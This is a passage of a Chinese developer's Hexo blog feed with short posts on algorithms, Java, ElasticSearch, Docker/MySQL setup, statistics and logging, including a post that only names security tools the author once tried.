s:</span><br><span class="line">          <span class="keyword">if</span> c &gt;= <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> c &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">              c = <span class="string">&#x27;digit&#x27;</span></span><br><span class="line">          <span class="keyword">if</span> c == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">              c = <span class="string">&#x27;blank&#x27;</span></span><br><span class="line">          <span class="keyword">if</span> c <span class="keyword">in</span> [<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>]:</span><br><span class="line">              c = <span class="string">&#x27;sign&#x27;</span></span><br><span class="line">          <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> state[currentState].keys():</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">          currentState = state[currentState][c]</span><br><span class="line">      <span class="keyword">if</span> currentState <span class="keyword">not</span> <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">9</span>]:</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p><img src="http://normanyahq.github.io/static/files/valid_number_dfa.svg"></p>]]></content>
      
      
      <categories>
          
          <category> Data Structures and Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DFA </tag>
            
            <tag> 有穷状态自动机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>背包问题</title>
      <link href="/2017/08/29/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
      <url>/2017/08/29/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://www.importnew.com/13072.html">01 背包</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Data Structures and Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap的工作原理</title>
      <link href="/2017/08/29/HashMap%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
      <url>/2017/08/29/HashMap%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>设计的非常优雅，必须要研究下源码</p><ul><li><a href="http://www.importnew.com/7099.html">HashMap的工作原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HashMap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch 默认size为10</title>
      <link href="/2017/08/22/ElasticSearch%20%E9%BB%98%E8%AE%A4size%E4%B8%BA10/"/>
      <url>/2017/08/22/ElasticSearch%20%E9%BB%98%E8%AE%A4size%E4%B8%BA10/</url>
      
        <content type="html"><![CDATA[<p>在ElasticSearch中，默认的搜索个数是10条数据。</p><p>在没有传递size的时候，如果有聚合函数，最后返回后的size也是10条，所以就导致返回了部分数据的情况。</p><p>在搜索分页的时候也是一样的情况。</p><p>如果搜索size大于10000，需要设置 <code>index.max_result_window</code> 参数 ，默认为10000。</p>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java里的Arrays.asList不能用add和remove方法</title>
      <link href="/2017/08/14/Java%E9%87%8C%E7%9A%84Arrays.asList%E4%B8%8D%E8%83%BD%E7%94%A8add%E5%92%8Cremove%E6%96%B9%E6%B3%95/"/>
      <url>/2017/08/14/Java%E9%87%8C%E7%9A%84Arrays.asList%E4%B8%8D%E8%83%BD%E7%94%A8add%E5%92%8Cremove%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; list = Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    list.add(<span class="number">4</span>);</span><br><span class="line">    System.out.print(list.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; list = Lists.newArrayList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    list.add(<span class="number">5</span>);</span><br><span class="line">    System.out.print(list.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码test会throw UnsupportedOperationException。test2使用了Guava工具类，正常输出数组内容。</p><p>查看源代码，Arrays.asList 创建的ArrayList是一个内部类，继承自AbstractList同时实现了RandomAccess和Serializable接口。而在抽象类AbstractList中，set add remove的定义是空的，默认<code>throw new UnsupportedOperationException();</code>。</p><p>所以呢，在Arrays.asList出来的List是一个只读的列表，不支持新增、删除、设置。</p><p><img src="/assets/images/Arrays.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合类 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式之装饰器模式</title>
      <link href="/2017/08/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/"/>
      <url>/2017/08/11/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="废话"><a href="#废话" class="headerlink" title="废话"></a>废话</h1><p>装饰器模式的典型应用就是JAVA的IO操作里面。</p>]]></content>
      
      
      <categories>
          
          <category> Design Pattern </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 装饰器模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>曾经折腾的黑客工具</title>
      <link href="/2017/08/11/%E6%9B%BE%E7%BB%8F%E6%8A%98%E8%85%BE%E7%9A%84%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"/>
      <url>/2017/08/11/%E6%9B%BE%E7%BB%8F%E6%8A%98%E8%85%BE%E7%9A%84%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>那些年折腾过的黑客工具</p><ul><li>Google hack</li><li>nc(Netcat)</li><li>who am i</li><li>ping</li><li>nmap</li><li>Acunetix</li><li>wireshark</li><li>BurpSuite</li><li>sqlmap</li><li>Metasploit</li><li>中国菜刀</li><li>Aircrack-ng</li><li>vim</li><li>hsf(http file system)开源的</li><li>灰鸽子</li><li>dig&#x2F;nslookup</li><li>Havij pro</li><li>…</li></ul>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>卡方分布与卡方检验</title>
      <link href="/2017/08/11/%E5%8D%A1%E6%96%B9%E5%88%86%E5%B8%83%E4%B8%8E%E5%8D%A1%E6%96%B9%E6%A3%80%E9%AA%8C/"/>
      <url>/2017/08/11/%E5%8D%A1%E6%96%B9%E5%88%86%E5%B8%83%E4%B8%8E%E5%8D%A1%E6%96%B9%E6%A3%80%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>若 $k$ 个独立的随机变量 $ Z_1 Z_2 … Z_k $，且符合标准正态分布$N(0,1)$，则这 $k$ 个随机变量的平方和 </p><p>$$ X &#x3D; \sum_{i&#x3D;1}^k Z_i^2 $$</p><p>为服从自由度为 $k$ 的卡方分布，记为： </p><p>$ X \sim \chi^2(k) $ 也可以记为 $ X \sim \chi_k^2 $</p><p>卡方分布的期望与方差分为为：$E(χ2)&#x3D;n$，$D(χ2)&#x3D;2n$，其中 $n$ 为卡方分布的自由度。</p><p>有一个计算的例子可以参考链接。</p><ul><li><a href="http://blog.csdn.net/bitcarmanlee/article/details/52279907">卡方分布与卡方检验</a></li><li><a href="http://www.cnblogs.com/baiboy/p/tjx11.html">卡方分布的应用</a></li><li><a href="http://guoze.me/2015/09/07/chi-square/">卡方检验原理及应用</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 统计学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>坐标系旋转矩阵</title>
      <link href="/2017/08/09/%E5%9D%90%E6%A0%87%E7%B3%BB%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5/"/>
      <url>/2017/08/09/%E5%9D%90%E6%A0%87%E7%B3%BB%E6%97%8B%E8%BD%AC%E7%9F%A9%E9%98%B5/</url>
      
        <content type="html"><![CDATA[<p>$$ \left[<br>    \begin{array}{cc}<br>      cos(α) &amp; -sin(α) \\<br>      sin(α) &amp; cos(α)<br>    \end{array}<br>\right] $$</p><h1 id="left-begin-array-c-x’-y’-end-array-right"><a href="#left-begin-array-c-x’-y’-end-array-right" class="headerlink" title="$$\left[    \begin{array}{c}      x’ \\      y’    \end{array}\right]"></a>$$<br>\left[<br>    \begin{array}{c}<br>      x’ \\<br>      y’<br>    \end{array}<br>\right]</h1><p>\left[<br>    \begin{array}{cc}<br>      cos(α) &amp; -sin(α) \\<br>      sin(α) &amp; cos(α)<br>    \end{array}<br>\right]<br>\left[<br>    \begin{array}{c}<br>      x \\<br>      y<br>    \end{array}<br>\right]<br>$$</p><ul><li><a href="http://blog.csdn.net/tom_00001/article/details/62054572">坐标系旋转矩阵推导过程</a></li><li><a href="http://blog.miskcoo.com/2016/12/rotation-in-3d-space">三维空间中的旋转：旋转矩阵、欧拉角</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 旋转矩阵 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RocketMQ</title>
      <link href="/2017/08/08/RocketMQ/"/>
      <url>/2017/08/08/RocketMQ/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://blog.csdn.net/lovesomnus/article/details/51754820">RocketMQ介绍</a></li><li><a href="http://blog.csdn.net/lovesomnus/article/details/51769977">RocketMQ集群配置</a></li><li><a href="http://www.jianshu.com/p/453c6e7ff81c">分布式开放消息系统(RocketMQ)的原理与实践</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RocketMQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch</title>
      <link href="/2017/08/08/ElasticSearch/"/>
      <url>/2017/08/08/ElasticSearch/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="http://www.wklken.me/posts/2016/06/29/deploy-es.html#9-zheng-shi-qi-dong">ELASTICSEARCH集群部署文档</a></li><li><a href="http://www.wklken.me/posts/2016/05/24/elk-mysql-slolog.html">LOGSTASH+ELASTICSEARCH处理MYSQL慢查询日志</a></li></ul><p>ElasticSearch 的 mapping修改比较坑，需要新建、迁移数据、删除老索引。</p><ul><li><a href="http://www.cnblogs.com/Creator/p/3722408.html">记录一次mapping field修改过程</a></li><li><a href="http://blog.csdn.net/napoay/article/details/52119957">删除文档的field以及field的属性</a></li></ul><p>可以参考下面的demo</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span> <span class="string">&quot;truck_*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;number_of_shards&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;number_of_replicas&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;store&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;compress&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;tv&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;stored&quot;</span><span class="punctuation">:</span> <span class="string">&quot;false&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mappings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;mileage&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;_source&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;_all&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;enabled&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="string">&quot;not_analyzed&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;gps_id&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="string">&quot;not_analyzed&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;distance&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;integer&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;start_time_ms&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;date&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;epoch_millis&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aliases&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;truck_location&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Big Data </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UPDATE 单列和多列效率对比</title>
      <link href="/2017/08/03/UPDATE%20%E5%8D%95%E5%88%97%E5%92%8C%E5%A4%9A%E5%88%97%E6%95%88%E7%8E%87%E5%AF%B9%E6%AF%94/"/>
      <url>/2017/08/03/UPDATE%20%E5%8D%95%E5%88%97%E5%92%8C%E5%A4%9A%E5%88%97%E6%95%88%E7%8E%87%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<p>UPDATE 单列和多列效率对比，比如说</p><ul><li>update student set name&#x3D;’foo’ where id &#x3D; 1</li><li>update student set name&#x3D;’foo’ , age &#x3D; 10 where id &#x3D; 1</li></ul><p>考虑索引数量和重构索引的逻辑。</p><p>数据库更新数据是怎么做的？先删除后新增</p><p><a href="http://use-the-index-luke.com/sql/dml/update">http://use-the-index-luke.com/sql/dml/update</a></p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>删除CleanMyMac</title>
      <link href="/2017/07/29/%E5%88%A0%E9%99%A4CleanMyMac/"/>
      <url>/2017/07/29/%E5%88%A0%E9%99%A4CleanMyMac/</url>
      
        <content type="html"><![CDATA[<p>终结命令，<code>mdfind -name CleanMyMac</code>，挨着挨着删除。</p><p>官方的说明，CleanMyMac 需要自己删除自己。注意别把这篇文章给删除掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/Users/xxxx/Library/Caches/Metadata/Safari/History/http:%2F%2Fwww.mycleanmymac.com%2Fxiazaianzhuang%2Fshanchu-cmm.html.webhistory</span><br><span class="line">/Users/xxxx/Library/Application Support/CleanMyMac 3/CleanMyMac 3 Scheduler.app</span><br><span class="line">/Users/Shared/CleanMyMac 3</span><br><span class="line">/Library/PrivilegedHelperTools/com.macpaw.CleanMyMac3.Agent</span><br><span class="line">/Library/LaunchDaemons/com.macpaw.CleanMyMac3.Agent.plist</span><br><span class="line">/Users/xxxx/Pictures/照片 图库.photoslibrary/private/com.macpaw.CleanMyMac3</span><br><span class="line">/Users/xxxx/Library/LaunchAgents/com.macpaw.CleanMyMac3.Scheduler.plist</span><br><span class="line">/Users/Shared/CleanMyMac 3 Menu</span><br><span class="line">/Users/xxxx/Library/Application Scripts/com.macpaw.CleanMyMac3.StorageManagement</span><br><span class="line">/Users/xxxx/Library/Application Support/CleanMyMac 3 Menu</span><br><span class="line">/Users/xxxx/Library/Containers/com.macpaw.CleanMyMac3.StorageManagement</span><br><span class="line">/Users/xxxx/Library/Application Support/CleanMyMac 3</span><br><span class="line">/Users/xxxx/Library/Application Support/CleanMyMac 2</span><br><span class="line">/Users/Shared/CleanMyMac 2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CleanMyMac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MyCat(Docker)</title>
      <link href="/2017/07/29/MyCat(Docker)/"/>
      <url>/2017/07/29/MyCat(Docker)/</url>
      
        <content type="html"><![CDATA[<p>为了更好的使用mycat，又不想去研究本机系统开启多个mysql实例，故考虑使用docker来开启多个mysql，然后使用mycat做分库分表中间价。</p><p>默认的mysql镜像中是不包含任何的编辑工具，设计的理由说是这样镜像会更小。那怎么在docker中使用编辑器如vim可以参考stackoverflow的回答，<a href="https://stackoverflow.com/questions/30853247/how-to-edit-file-after-i-shell-to-a-docker-container">https://stackoverflow.com/questions/30853247/how-to-edit-file-after-i-shell-to-a-docker-container</a>。</p><p>在Container重启后发现存在一个问题，之前修改的&#x2F;etc&#x2F;apt&#x2F;source.list 在重启后恢复了原样，不能找回之前修改后的地方，同样，如果是创建一个文件，但是当这个container退出以后，如果以同一个的image启动了另一个container，在这个container中是看不到之前那个container创建的文件的。</p><p>如果想让后面的container看到之前那个container创建的文件，就要把之前那个container保存成一个镜像commit，然后基于这个镜像来启动后面的那个container。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">列举几个可能需要的命令</span><br><span class="line"></span><br><span class="line">docker pull mysql</span><br><span class="line">docker run -p 12345:3306 --name mysql -e MYSQL_ROOT_PASSWORD=x -d </span><br><span class="line">docker run -p 12346:3306 --name mysql_1 -e MYSQL_ROOT_PASSWORD=x -d </span><br><span class="line">docker.io/mysql</span><br><span class="line">docker ps -a</span><br><span class="line">docker <span class="built_in">rm</span> f mysql</span><br><span class="line">mysql -uroot -h127.0.0.1 -P12345 -px</span><br><span class="line">mysql -uroot -h127.0.0.1 -P12346 -px</span><br><span class="line">docker <span class="built_in">cp</span> <span class="built_in">source</span> romote</span><br><span class="line">docker <span class="built_in">cp</span> sources.list mysql_1:/etc/apt/sources.list</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install vim</span><br><span class="line">docker commit mysql mysql:1.0</span><br></pre></td></tr></table></figure><p>参考链接</p><ul><li><a href="http://github.com/MyCATApache/Mycat-Server">http://github.com/MyCATApache/Mycat-Server</a></li><li><a href="http://dl.mycat.io/1.6-RELEASE/">http://dl.mycat.io/1.6-RELEASE/</a></li><li><a href="https://severalnines.com/blog/mysql-docker-containers-understanding-basics">https://severalnines.com/blog/mysql-docker-containers-understanding-basics</a></li><li><a href="http://mirrors.ustc.edu.cn/help/debian-security.html">中科大debian-security源</a></li><li><a href="http://mirrors.ustc.edu.cn/help/debian.html">中科大debian源</a></li><li><a href="http://blog.csdn.net/permike/article/details/51879578">docker常用命令详解</a></li><li><a href="https://my.oschina.net/nyp/blog/735622">详解使用DockerHub官方的mysql镜像生成容器</a></li><li><a href="https://severalnines.com/blog/mysql-docker-containers-understanding-basics">MySQL Docker Containers: Understanding the basics</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mycat </tag>
            
            <tag> mysql </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Felix 相关</title>
      <link href="/2017/07/23/Felix%20%E7%9B%B8%E5%85%B3/"/>
      <url>/2017/07/23/Felix%20%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>注意，Felix目前最新的版本只能使用JDK7，在JDK8上面无法正常启动服务。bundle 导出后放入到plugins中，felix回自动reload这个包，实现无缝升级，但是前提是你的代码中处理了destroy相关的代码，不然可能无法正常uninstall plugin bundle。</p><p>help<br>ps<br>start<br>install  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:port/system/console/shell</span><br></pre></td></tr></table></figure><p>这货很好，但是也很坑，在某一个时代来看，是一种比较好的方案。未来都是微服务…</p><ul><li><a href="http://zqc-0101.iteye.com/blog/1153291">在Eclipse中搭建Apache Felix环境</a></li><li><a href="http://zqc-0101.iteye.com/blog/1183452">在Apache Felix中运行bundle</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Felix </tag>
            
            <tag> OSGI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态更新slf4j日志的级别</title>
      <link href="/2017/07/21/%E5%8A%A8%E6%80%81%E6%9B%B4%E6%96%B0slf4j%E6%97%A5%E5%BF%97%E7%9A%84%E7%BA%A7%E5%88%AB/"/>
      <url>/2017/07/21/%E5%8A%A8%E6%80%81%E6%9B%B4%E6%96%B0slf4j%E6%97%A5%E5%BF%97%E7%9A%84%E7%BA%A7%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<p>动态更新slf4j日志的级别</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">RESULT_LOGGER</span> <span class="operator">=</span> <span class="string">&quot;logger level update %s! key = %s, level = %s.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">freshLogback</span><span class="params">(String key, String level)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isBlank(key) || StringUtils.isBlank(level)) &#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(RESULT_LOGGER, <span class="string">&quot;faill&quot;</span>, key, level);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">LoggerContext</span> <span class="variable">loggerContext</span> <span class="operator">=</span> (LoggerContext) LoggerFactory.getILoggerFactory();</span><br><span class="line"></span><br><span class="line">    ch.qos.logback.classic.Logger clogger;</span><br><span class="line">    <span class="comment">// 设置全局日志级别</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;*&quot;</span>.equals(key)) &#123; <span class="comment">// 设置全局日志级别</span></span><br><span class="line">        clogger = loggerContext.getLogger(Logger.ROOT_LOGGER_NAME);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 设置某个类日志级别-可以实现定向日志级别调整</span></span><br><span class="line">        clogger = loggerContext.getLogger(key);</span><br><span class="line">    &#125;</span><br><span class="line">    clogger.setLevel(Level.toLevel(level, Level.INFO));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//List&lt;ch.qos.logback.classic.Logger&gt; loggerList = loggerContext.getLoggerList();</span></span><br><span class="line">    <span class="comment">//for (ch.qos.logback.classic.Logger clogger1 : loggerList) &#123;</span></span><br><span class="line">    <span class="comment">//    LOGGER.info(clogger1.getName());</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="keyword">return</span> String.format(RESULT_LOGGER, <span class="string">&quot;ok&quot;</span>, key, level);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> slf4j </tag>
            
            <tag> logback </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA线程池</title>
      <link href="/2017/07/18/Java%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2017/07/18/Java%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
